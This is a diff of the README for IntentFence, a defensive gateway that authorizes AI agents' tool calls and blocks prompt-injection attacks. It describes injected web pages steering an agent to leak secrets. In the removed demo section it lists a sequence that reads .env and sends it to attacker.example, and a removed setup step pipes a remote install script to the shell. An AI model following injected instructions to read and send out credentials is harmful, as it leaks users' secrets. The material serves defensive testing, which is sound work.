@@ -1,425 +1,208 @@
 # IntentFence
 
-**Runtime authorization for autonomous AI agents.** IntentFence converts a user's delegated objective into a typed Intent Contract and places a fail-closed authorization boundary in front of protected agent actions.
+**Runtime authorization for tool-using AI agents.** IntentFence lets a local model research the live web while an independent, fail-closed gateway decides whether every proposed tool call may execute.
 
 [![CI](https://github.com/rajeet-04/INTENTFENCE/actions/workflows/ci.yml/badge.svg)](https://github.com/rajeet-04/INTENTFENCE/actions/workflows/ci.yml)
 [![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
 
-## Problem statement
+![IntentFence live agent search](docs/assets/phase10/agent-live-search.png)
 
-Autonomous agents can browse untrusted content and then invoke high-impact tools with the user's credentials. Prompt injection can exploit that path: a malicious page may ask an agent to read secrets, send data elsewhere, or take actions the user never authorized. Prompt-only defenses are not a reliable security boundary because the same model is asked both to interpret untrusted text and police its own behavior.
+## Problem
+
+AI agents can read untrusted webpages and then invoke tools with the user's credentials. A prompt-injected page may tell the model to read secrets, send data to an attacker, or perform work the user never delegated. Asking that same model to police itself is not a reliable security boundary.
 
 ## Solution
 
-IntentFence separates reasoning from authorization. It compiles the user's objective into a strict, versioned Intent Contract and places a protected-tool gateway between agent reasoning and execution. Deterministic policy, stateful action-chain analysis, purpose-bound data flow, and semantic relevance are implemented behind typed boundaries. The `/authorize` path integrates deterministic policy and state, while the protected-tool gateway composes the canonical Phase 2 policy, Phase 3 state, Phase 4 data-flow, and Phase 5 semantic engines in production. Hard rules remain authoritative, and uncertainty fails closed to approval instead of silently executing.
+IntentFence separates **reasoning** from **authority**:
 
-The current prototype includes the shared contracts, deterministic policy and classification, stateful authorization, purpose-bound data-flow controls, semantic intent evaluation, the protected-tool gateway, sanitized Action Receipts/security events, a FastAPI surface, a dashboard shell, and a controlled before/after prompt-injection demo.
+1. The server compiles the user's objective into a strict, versioned Intent Contract.
+2. Local `qwen3:14b` may propose search, fetch, file, message, or HTTP actions.
+3. Every proposal crosses the authoritative IntentFence gateway before execution.
+4. Deterministic policy, stateful chain analysis, and purpose-bound data flow compose the Agent decision; the general gateway also supports Phase 5 semantic evaluation after hard rules allow.
+5. Only `ALLOW` reaches a handler. `BLOCK` and `REQUIRE_APPROVAL` do not execute.
+6. The UI streams decisions, receipts, sources, citations, and the final answer without exposing secrets or chain-of-thought.
 
-## Integration milestone
+The result is a working GPT-style research console, not a static simulation. It performs real local-model tool calling against hosted web search/fetch integrations, while the Evidence tab preserves a deterministic attack demonstration and measured benchmark results. Provider errors fail closed with visible receipts, so a hosted fetch outage never becomes an ungoverned fallback.
 
-**Phases 1–6 are integrated on `main`** and form the current merged security baseline:
+## Phase 1–10 completion
 
-1. **Phase 1 — Foundation:** strict shared contracts, API boundaries, persistence primitives, and fail-closed validation.
-2. **Phase 2 — Deterministic security:** resource/destination classification, policy rules, hard blocks, approval rules, and risk aggregation.
-3. **Phase 3 — Stateful authorization:** bounded security context, action-chain analysis, accumulated risk, and intent-drift signals.
-4. **Phase 4 — Purpose-bound data flow:** provenance-aware labels, controlled propagation, destination constraints, and fail-closed egress enforcement.
-5. **Phase 5 — Production semantic authorization:** compact semantic context, strict local/hybrid evaluation, fail-closed provider handling, and deterministic-precedence preservation.
-6. **Phase 6 — Authoritative interception gateway:** gateway-owned state and trusted labels, protected execution, sanitized receipts/events, and a controlled before/after attack demo.
+| Phase | Integrated capability |
+| --- | --- |
+| 1 | Strict shared contracts, API boundaries, persistence primitives, JWT attestation evidence, and fail-closed validation |
+| 2 | Resource/destination classification, deterministic policy rules, hard blocks, approvals, and risk aggregation |
+| 3 | Gateway-owned security context, action history, accumulated risk, drift, and compound action-chain analysis |
+| 4 | Trusted data labels, provenance, purpose binding, propagation, and destination-aware egress controls |
+| 5 | Structured local/hybrid semantic authorization with deterministic precedence and safe provider failure handling |
+| 6 | Authoritative interception for five core protected tools, handler gating, receipts, events, and the hotel attack comparison |
+| 7 | Explainable security-operations UI with action stream, rule reasons, data/destination evidence, and chain context |
+| 8 | Reproducible 20-scenario benchmark, SQLite event store, measured KPI API, and source-backed dashboard metrics |
+| 9 | MCP-shaped interception, real sandbox effects, local Ollama tool calling, hosted web provider, poison tests, and Mac smoke gate |
+| 10 | Server-owned agent sessions/revisions, SSE chat orchestration, real search/fetch citations, GPT-style console, native launcher, release gates, and judge package |
 
-The Phase 6 gateway owns the public authority boundary around the canonical Phase 2 policy, Phase 3 state, Phase 4 data-flow, and Phase 5 semantic adapters. Public callers cannot disable protection or supply trusted security state and data labels.
+## Current measured evidence
 
-## Submission snapshot
+| Measure | Result |
+| --- | --- |
+| Attack Blocking Rate | **100% — 16/16** |
+| Safe Task Completion Rate | **100% — 8/8** |
+| False Positive Rate | **0% — 0/16** |
+| Controlled poison actions blocked | **2** |
+| Attacker sink executions | **0** |
+| Latest live local-model gate | `web_search` authorized; hosted `web_fetch` returned 404 and failed closed with `TOOL_PROVIDER_ERROR` |
+| Live grounded response | cited source and non-empty answer |
 
-| Module | Status | Evidence |
-| --- | --- | --- |
-| Typed Intent Contracts and security models | Implemented | `packages/contracts` |
-| Resource, destination, and authority classification | Implemented; used by `/authorize` and gateway | `packages/classification` |
-| Deterministic fail-closed policy | Implemented; used by `/authorize` and gateway | `packages/policy` |
-| Stateful action-chain authorization | Implemented; used by `/authorize` and gateway | `packages/state` |
-| Purpose-bound data-flow enforcement | Implemented and integrated into the gateway | `packages/dataflow` |
-| Local/hybrid semantic intent layer | Implemented and integrated into the production API gateway; Ollama optional | `apps/api/src/intentfence_api/semantic` and `apps/api/src/intentfence_api/app.py` |
-| Protected-tool interception and receipts | Implemented with authoritative Phase 2–6 enforcement | `apps/api/src/intentfence_api/gateway` |
-| Golden hotel prompt-injection comparison | Implemented | `POST /demo/hotel-attack` |
-| Security dashboard | Prototype shell | `apps/dashboard` |
-| Automated verification | 250 backend tests plus lint, typecheck, and production build | `make verify` and `.github/workflows/ci.yml` |
+See [VERIFICATION.md](logs/handoff/phase-10-release/VERIFICATION.md) for commands and [the Evidence screenshot](docs/assets/phase10/evidence-benchmark.png) for the rendered view.
 
-Deployment is intentionally out of scope for this evaluation round; the repository runs locally and is designed to be directly reviewable.
+## Judge quick start
 
-## Tech stack
+Prerequisites: macOS, Python 3.12, [uv](https://docs.astral.sh/uv/), [Bun](https://bun.sh/), and [Ollama](https://ollama.com/). On an M4 with 24 GB unified memory, the approved agent model is `qwen3:14b` with a 32K context.
 
-- Python 3.12, FastAPI, Pydantic, SQLAlchemy, HTTPX, Pytest, and Ruff
-- Next.js 15, React 19, and TypeScript
-- uv for Python/runtime management and Bun for dashboard dependencies/scripts
-- SQLite for local persistence and optional Ollama for local semantic evaluation
+One-time setup:
+
+```bash
+make setup BUN="$HOME/.bun/bin/bun"
+cp .env.example .env
+ollama pull qwen3:14b
+```
+
+Set these values only in the ignored local `.env`:
+
+```text
+INTENTFENCE_AGENT_OLLAMA_BASE_URL=http://127.0.0.1:11434
+INTENTFENCE_AGENT_OLLAMA_MODEL=qwen3:14b
+INTENTFENCE_AGENT_OLLAMA_CONTEXT_LENGTH=32768
+INTENTFENCE_AGENT_OLLAMA_TIMEOUT_SECONDS=300
+INTENTFENCE_AGENT_CLOUD_FALLBACK_ENABLED=true
+INTENTFENCE_AGENT_CLOUD_BASE_URL=https://ollama.com
+INTENTFENCE_AGENT_CLOUD_MODEL=gpt-oss:120b-cloud
+INTENTFENCE_LIVE_WEB_ENABLED=true
+INTENTFENCE_OLLAMA_API_KEY=<local key; never commit>
+```
+
+Start everything from the repository root:
+
+```bash
+ollama serve   # only if Ollama is not already running
+make dev
+```
+
+`make dev` is idempotent: it reuses healthy services, starts only missing ones, prints secret-safe readiness, and terminates only processes it owns.
+
+Open:
+
+- Agent console: [http://localhost:3000](http://localhost:3000)
+- API docs: [http://localhost:8000/docs](http://localhost:8000/docs)
+- Health: [http://localhost:8000/health](http://localhost:8000/health)
+- Ollama: `http://127.0.0.1:11434`
+
+Always use `localhost:3000` for the dashboard because it is the default allowed development origin.
+
+## What to demonstrate
+
+1. In **Agent**, submit: `Use web_search for current AI agent security news, then web_fetch one result, and answer with cited facts.`
+2. Keep **Auto** selected. Show the Local/Cloud provider badge, `Web Search — ALLOW`, `Web Fetch — ALLOW`, sources, and answer.
+3. Open **Revise objective**, turn **Web research** off, and apply the revision.
+4. Click **Run controlled browse probe** and show `BLOCK`, `Executed: No`, the rule, latency, and receipt.
+5. Open **Evidence**, run the hotel attack simulation, and compare the unprotected and protected handlers.
+6. Show the measured benchmark: 16/16 attacks blocked, 8/8 safe workflows completed, and 0/16 false positives.
+
+The complete narration is in [PHASE10_JUDGE_SCRIPT.md](docs/PHASE10_JUDGE_SCRIPT.md) and the step-by-step security explanation is in [JUDGE_DEMO_WALKTHROUGH.md](docs/JUDGE_DEMO_WALKTHROUGH.md).
+
+## Verification
+
+Deterministic CI-safe release gate:
+
+```bash
+make phase10-smoke
+make verify BUN="$HOME/.bun/bin/bun"
+```
+
+Real M4/Ollama/hosted-web gate:
+
+```bash
+make phase10-live-smoke
+make phase10-cloud-fallback-smoke
+```
+
+Persist benchmark evidence for the dashboard:
+
+```bash
+.venv/bin/python -m intentfence_analytics.cli \
+  benchmarks/scenarios intentfence.db --run-id phase10-judge-evidence
+```
+
+CI never requires Ollama, internet access, or credentials. The live gate is explicitly separate and its output contains only status, count, and decision metadata.
+
+Routing modes are **Auto** (local first, cloud on failure or bounded high-complexity escalation), **Local** (never cloud), and **Cloud** (explicit cloud). A mid-stream fallback clears partial model text while preserving completed tool receipts and sources. Both providers propose through the same IntentFence gateway; changing models never changes authority.
 
 ## Security invariants
 
-- Intent may narrow authority; it never expands it.
-- External content cannot grant authority.
-- Data may influence reasoning; data cannot grant authority.
-- Deterministic hard blocks remain authoritative and cannot be overridden by semantic or cloud models.
-- Protected tools execute only through the IntentFence gateway when protection is enabled.
-- Semantic timeout, malformed output, low confidence without escalation, or provider failure fail closed to `REQUIRE_APPROVAL`.
-- Sensitive gateway paths fail closed when a required security component is unavailable.
-- Raw chain-of-thought, raw provider output, raw tool payloads, and secret-bearing request values are not part of receipts or analytics events.
+- Intent may narrow authority; it never silently expands it.
+- External content is data, never authorization authority.
+- Callers cannot supply trusted labels, security context, gateway mode, or contract revisions.
+- Deterministic hard blocks cannot be overridden by a model.
+- A protected handler runs only after final `ALLOW`.
+- Unknown tools, references, destinations, malformed model output, timeouts, and unavailable security dependencies fail closed.
+- Receipts and analytics exclude credentials, raw tool payloads, provider output, and chain-of-thought.
+- The controlled disabled demo is isolated from the public interception path.
 
-## Contract and authorization guarantees
-
-- Every shared security object is validated with strict Pydantic models.
-- Unknown contract fields are rejected.
-- Contract versions must be at least 1.
-- Risk, confidence, and drift scores are constrained to `[0, 1]`.
-- `/authorize` blocks session mismatches, intent mismatches, and expired Intent Contracts.
-- External content is represented as source context, not authorization authority.
-- Action Receipts and SecurityContext state can be persisted through SQLite.
-- `/authorize` evaluates the integrated deterministic policy and state engine.
-- The semantic layer remains advisory and cannot replace deterministic authorization.
-
-## Phase 5 semantic intent layer
-
-Phase 5 is integrated into the production gateway and provides:
-
-- strict `SemanticEvaluation` results with `ALLOW`, `BLOCK`, or `REQUIRE_APPROVAL` recommendations;
-- compact semantic context containing the active objective, authorization boundaries, action metadata, state indicators, and data labels without arbitrary full history or raw secret-bearing values;
-- a structured semantic judge that validates provider JSON and fails closed on timeout, malformed output, or provider errors;
-- an Ollama adapter for local inference;
-- optional local-to-cloud semantic escalation through an injected cloud judge;
-- a high-risk escalation guard so cloud semantic alignment cannot convert high-risk approval state into `ALLOW`;
-- a versioned Intent Contract compiler and revision path;
-- a stable operator-facing semantic summary containing only the decision hint, reason, relevance, confidence, source, model, latency, and escalation state.
-
-## Phase 6 interception gateway
-
-Phase 6 exposes exactly five protected core tools:
-
-- `browse_web`
-- `read_file`
-- `write_file`
-- `send_message`
-- `http_request`
-
-The gateway normalizes every protected request into the shared `ToolRequest` contract, enriches it with resource and destination metadata, composes policy/state-data-flow adapter signals and an optional semantic signal, executes the handler only after `ALLOW`, and emits both an `ActionReceipt` and metadata-only `SecurityEvent`.
-
-Decision precedence is intentionally conservative:
-
-1. deterministic or state/data-flow hard `BLOCK`;
-2. any other deterministic/state `BLOCK`;
-3. deterministic/state `REQUIRE_APPROVAL`;
-4. semantic decision only after deterministic layers allow;
-5. final `ALLOW` only after the relevant checks clear.
-
-A semantic `ALLOW` cannot override a hard block or approval requirement.
-
-The production `/gateway/intercept` path constructed in `intentfence_api.app` uses dedicated adapters for the canonical Phase 2 deterministic policy, the composed Phase 3 state plus Phase 4 data-flow engines, and the Phase 5 local/hybrid semantic runtime. Controlled data references resolve through the Phase 4 registry and fail closed when unknown or duplicated. Semantic evaluation is invoked only when every deterministic layer returns `ALLOW`; other `IntentFenceGateway` instances may inject or omit a semantic adapter for controlled demos and tests. `BaselineSecurityAdapter` remains as a focused compatibility/test fixture rather than the production enforcement path.
-
-### Golden hotel attack
-
-For a judge-ready narration of every action and its Phase 1–6 implementation,
-see [`docs/JUDGE_DEMO_WALKTHROUGH.md`](docs/JUDGE_DEMO_WALKTHROUGH.md).
-
-`POST /demo/hotel-attack` runs one immutable scenario twice with the same protected-tool sequence:
+## Architecture
 
 ```text
-browse_web(hotel-a)
-browse_web(hotel-b with hidden injection)
-read_file(.env)
-http_request(attacker.example)
-write_file(workspace/hotel-choice.txt)
+Browser / Agent Console
+        │ POST /agent/chat/stream (SSE)
+        ▼
+Server-owned Agent Session + versioned Intent Contract
+        │
+        ▼
+Local Ollama qwen3:14b ── proposes tool call only
+        │
+        ▼
+IntentFence authoritative gateway
+  ├─ deterministic policy
+  ├─ state/action-chain analysis
+  ├─ purpose-bound data flow
+  └─ Agent path stays deterministic; /gateway/intercept may add semantics
+        │ ALLOW only
+        ▼
+Sandboxed tool runtime / hosted web search and fetch
+        │
+        └─ sanitized event + receipt + citation → SSE → UI
 ```
 
-With `IntentFence` disabled, the controlled secret-read and exfiltration handlers are reached. With `IntentFence` enabled, the malicious path is stopped before the protected handler executes, while the legitimate hotel comparison still reaches the final safe write.
+See [PHASE10_ARCHITECTURE.md](docs/PHASE10_ARCHITECTURE.md) for boundaries and request flow.
 
-The demo stores only data references such as `data-secret`. It does not place a real credential in the scenario, receipt, event, or API response.
+## API surface
 
-### Sandboxed protected runtime
-
-The HTTP API uses `SandboxProtectedToolRuntime` for CI and hackathon demonstrations. It implements the five protected tool surfaces without performing real network, messaging, or filesystem side effects. Real integrations can replace injected handlers behind the authoritative `IntentFenceGateway.intercept_authoritative(...)` boundary.
-
-## Local semantic model
-
-Ollama is optional and is **not required by CI**. The local adapter can be configured with these environment variables:
-
-```text
-INTENTFENCE_SEMANTIC_OLLAMA_BASE_URL=http://localhost:11434
-INTENTFENCE_SEMANTIC_OLLAMA_MODEL=qwen2.5:7b
-INTENTFENCE_SEMANTIC_TIMEOUT_SECONDS=5
-```
-
-The same defaults are included in `.env.example`. Runtime wiring can load them through the typed application settings:
-
-```python
-from intentfence_api.config import get_settings
-from intentfence_api.semantic import OllamaProvider, StructuredSemanticJudge
-
-provider = OllamaProvider.from_settings(get_settings())
-judge = StructuredSemanticJudge(provider)
-```
-
-Direct constructor configuration remains available for tests and deployment-specific overrides:
-
-```python
-provider = OllamaProvider(
-    base_url="http://localhost:11434",
-    model="qwen2.5:7b",
-    timeout_seconds=5.0,
-)
-```
-
-Tests use `httpx.MockTransport`; they never contact a live model server. A cloud provider is also optional. `HybridSemanticJudge` accepts an injected cloud judge and escalates only when local confidence is below the configured threshold.
-
-### Phase 9 local agent and live-web smoke (M4, 24 GB)
-
-The Phase 9 judge path uses local `qwen3:14b` inference through Ollama with a 32K context window. Ollama Web Search and Web Fetch are separate hosted retrieval APIs, so that part requires internet access and a local API key. The key is read only from the environment and must never be committed.
-
-Install Ollama for macOS, start it, and download the approved model:
-
-```bash
-curl -fsSL https://ollama.com/install.sh | sh
-ollama serve
-ollama pull qwen3:14b
-# Optional fallback if judge latency is too high:
-ollama pull qwen3:8b
-```
-
-On this machine the CLI is also available at `$HOME/.local/bin/ollama`. In a new terminal, configure and run the complete live gate from the repository root:
-
-```bash
-export INTENTFENCE_AGENT_OLLAMA_BASE_URL=http://127.0.0.1:11434
-export INTENTFENCE_AGENT_OLLAMA_MODEL=qwen3:14b
-export INTENTFENCE_AGENT_OLLAMA_CONTEXT_LENGTH=32768
-export INTENTFENCE_LIVE_WEB_ENABLED=true
-export INTENTFENCE_OLLAMA_API_KEY='<set locally; never commit>'
-make phase9-mac-smoke
-```
-
-The smoke verifies the local model and tool calling, performs real hosted search/fetch, runs benign and controlled poisoned workflows through the authoritative gateway, proves disabled-versus-enabled sandbox effects, and reruns the Phase 8 benchmark. Its output contains only status/count/decision metadata.
-
-## Versioned Intent Contracts
-
-`IntentContractDraft` accepts only user-authorized contract fields. Unknown fields, including external-content instructions, are rejected. Compiling a draft produces contract version 1. Revising a contract:
-
-- preserves the session ID;
-- creates a new intent ID;
-- increments `contract_version`;
-- links `previous_intent_id` to the prior contract;
-- replaces authority with the newly delegated boundaries rather than inheriting authority from external content.
-
-## Security analytics contract
-
-Phase 6 security events are designed to feed Phase 7 explainability and Phase 8 metrics without raw sensitive payloads. Reproducible event definitions, KPI formulas, ground-truth joins, disabled-demo exclusions, and latency guardrails are documented in `docs/phase-6-analytics-contract.md`.
+- `GET /health` — fixed service health response
+- `GET /agent/readiness` — secret-safe Ollama/model/web readiness
+- `POST /authorize` — typed deterministic/state authorization
+- `POST /gateway/intercept` — authoritative protected-tool interception
+- `POST /agent/chat/stream` — strict POST-based SSE agent stream
+- `POST /demo/hotel-attack` — controlled disabled/enabled attack comparison
+- `GET /benchmarks/latest` — latest persisted, sanitized benchmark summary
 
 ## Repository structure
 
 ```text
-apps/
-  api/          FastAPI authorization, semantic, and gateway runtime
-  dashboard/    Next.js dashboard foundation
-packages/
-  contracts/    Shared typed security contracts
-  classification/ Resource, destination, and authority classification
-  policy/       Deterministic authorization rules and risk aggregation
-  state/        Stateful action-chain authorization and drift signals
-  dataflow/     Purpose-bound labels, propagation, and egress constraints
-docs/
-  phase-6-analytics-contract.md
-  superpowers/  Approved architecture and execution plans
+apps/api/               FastAPI, agent orchestration, gateway, sandbox, APIs
+apps/dashboard/         Next.js Agent and Evidence product views
+packages/contracts/     Typed security contracts
+packages/classification Resource, destination, and authority classification
+packages/policy/        Deterministic rules and risk aggregation
+packages/state/         Stateful authorization and action-chain analysis
+packages/dataflow/      Purpose-bound labels and egress constraints
+packages/analytics/     Benchmark runner, persistence, KPIs
+benchmarks/scenarios/   Benign, malicious, and mutated controlled corpus
+docs/                   Architecture, judge guides, plans, and screenshots
+logs/handoff/           Phase verification evidence
 ```
 
-## Prerequisites
+## Technology
 
-- [uv](https://docs.astral.sh/uv/) (provisions Python 3.12 automatically)
-- [Bun](https://bun.com/) 1.4.0 (the version pinned in CI)
+- Python 3.12, FastAPI, Pydantic, SQLAlchemy, HTTPX, Pytest, Ruff
+- Next.js 15, React 19, TypeScript, Bun
+- Ollama with local `qwen3:14b`; hosted Ollama Web Search/Fetch
+- SQLite for receipts, benchmark events, and local evidence
 
-## Quick start
-
-```bash
-make setup BUN="$HOME/.bun/bin/bun"
-cp .env.example .env
-make dev-api
-```
-
-In a second terminal:
-
-```bash
-make dev-dashboard BUN="$HOME/.bun/bin/bun"
-```
-
-The API is available at `http://127.0.0.1:8000`, interactive API documentation at `http://127.0.0.1:8000/docs`, and the dashboard at `http://localhost:3000`.
-
-Health check:
-
-```bash
-curl http://127.0.0.1:8000/health
-```
-
-Expected response:
-
-```json
-{"status":"ok","service":"intentfence-api"}
-```
-
-Run the controlled hotel comparison demo:
-
-```bash
-curl -X POST http://127.0.0.1:8000/demo/hotel-attack
-```
-
-The response runs the same five-step tool sequence with protection disabled and enabled. Review `secret_read_executed`, `exfiltration_executed`, `legitimate_workflow_completed`, decisions, receipt IDs, and sanitized security events to see the enforcement difference.
-
-## Judge demo
-
-The MVP demonstration does not require deployment, Ollama, or a cloud model. On a fresh clone, run the one-time setup from the repository root:
-
-```bash
-make setup BUN="$HOME/.bun/bin/bun"
-cp .env.example .env
-```
-
-If the backend and dashboard dependencies are already installed for the current checkout, skip that one-time setup. When uncertain, rerun the setup after removing or renaming a stale local environment. Start the API in terminal 1:
-
-```bash
-make dev-api
-```
-
-Start the dashboard in terminal 2:
-
-```bash
-make dev-dashboard BUN="$HOME/.bun/bin/bun"
-```
-
-Open these pages:
-
-- dashboard: `http://localhost:3000`
-- interactive API documentation: `http://127.0.0.1:8000/docs`
-
-In terminal 3, verify the API and run the controlled attack comparison:
-
-```bash
-curl -sS http://127.0.0.1:8000/health
-curl -sS -X POST http://127.0.0.1:8000/demo/hotel-attack \
-  | .venv/bin/python -m json.tool
-```
-
-Show the judges that the disabled run reaches the simulated secret read and exfiltration, while the enabled run blocks both and still completes the legitimate hotel-result write. The comparison uses the same five-step tool sequence in both modes and performs no real network, messaging, secret-read, or filesystem side effects.
-
-## Manual setup
-
-Backend:
-
-```bash
-uv python install 3.12
-uv venv --python 3.12 .venv
-uv pip install --python .venv/bin/python \
-  -e ./packages/contracts \
-  -e ./packages/classification \
-  -e ./packages/policy \
-  -e ./packages/state \
-  -e "./packages/dataflow[dev]" \
-  -e "./apps/api[dev]"
-```
-
-Dashboard:
-
-```bash
-cd apps/dashboard
-"$HOME/.bun/bin/bun" install --frozen-lockfile
-"$HOME/.bun/bin/bun" run dev
-```
-
-By default the dashboard probes `http://localhost:8000/health`. Override it with `NEXT_PUBLIC_API_BASE_URL` when needed. Ollama and all cloud providers are optional for the normal MVP and automated tests; only `make phase9-mac-smoke` makes live model and hosted web calls.
-
-## Verification
-
-Run the same gates used by CI:
-
-```bash
-make verify BUN="$HOME/.bun/bin/bun"
-```
-
-Verified on 2026-08-22: 250 backend tests passing; backend lint, SQLite initialization, API health smoke, dashboard lint, TypeScript checks, and the optimized Next.js production build complete successfully.
-
-Phase 6 focused tests:
-
-```bash
-.venv/bin/python -m pytest apps/api/tests/test_gateway_models.py \
-  apps/api/tests/test_gateway_tools.py \
-  apps/api/tests/test_gateway_precedence.py \
-  apps/api/tests/test_gateway_baseline.py \
-  apps/api/tests/test_gateway_service.py \
-  apps/api/tests/test_gateway_demo.py \
-  apps/api/tests/test_gateway_api.py \
-  apps/api/tests/test_gateway_state.py \
-  apps/api/tests/test_gateway_data_registry.py \
-  apps/api/tests/test_phase6_authority_integration.py -q
-```
-
-Semantic tests cover compact context, strict result validation, timeout/malformed/provider failure handling, Ollama request/response behavior, typed environment configuration, hybrid escalation, high-risk approval preservation, contract versioning, and operator-facing summaries.
-
-## API surface
-
-### `GET /health`
-
-Returns the fixed service health payload.
-
-### `POST /authorize`
-
-Accepts:
-
-- `ToolRequest`
-- `IntentContract`
-- `SecurityContext`
-
-Returns a typed fail-closed `Decision` from the integrated deterministic policy and state engine. The dedicated gateway surface handles protected-tool execution and receipt emission.
-
-### `POST /gateway/intercept`
-
-Accepts:
-
-- `ToolRequest`
-- `IntentContract`
-- optional `scenario_id`
-
-Gateway mode, security context, and trusted data labels are gateway-owned authority inputs. The public endpoint rejects callers that attempt to supply them.
-
-Returns `GatewayExecution`, which includes the final decision, execution state, sanitized result metadata, `ActionReceipt`, and `SecurityEvent`.
-
-### `POST /demo/hotel-attack`
-
-Runs the shared golden attack once with protection disabled and once with protection enabled. The response exposes matching tool sequences, decisions, receipt IDs, events, whether the malicious handlers executed, and whether the legitimate workflow completed.
-
-## Shared contracts
-
-The shared contract package exports:
-
-- `IntentContract`
-- `ToolRequest`
-- `DataLabel`
-- `SecurityContext`
-- `Decision`
-- `ActionReceipt`
-
-These interfaces are the stable boundary consumed by policy, state, data-flow, semantic, gateway, benchmark, and console phases.
-
-## Branch convention
-
-Feature work:
-
-```text
-<github-user>/phase-<n>-feat-<slug>
-```
-
-Bug fixes:
-
-```text
-<github-user>/phase-<n>-bug-<slug>
-```
-
-Example:
-
-```text
-rajeet/phase-6-feat-gateway
-```
-
-## Development rule
-
-Security implementation is merged serially through reviewed pull requests. Parallel phase work may expose stable interfaces, but final authorization precedence is integrated only after its dependency phases are available and the full CI gate is green.
+Deployment is intentionally not required for this evaluation. The repository is locally runnable, reviewable, and contains deterministic CI gates alongside an explicit live-model gate.
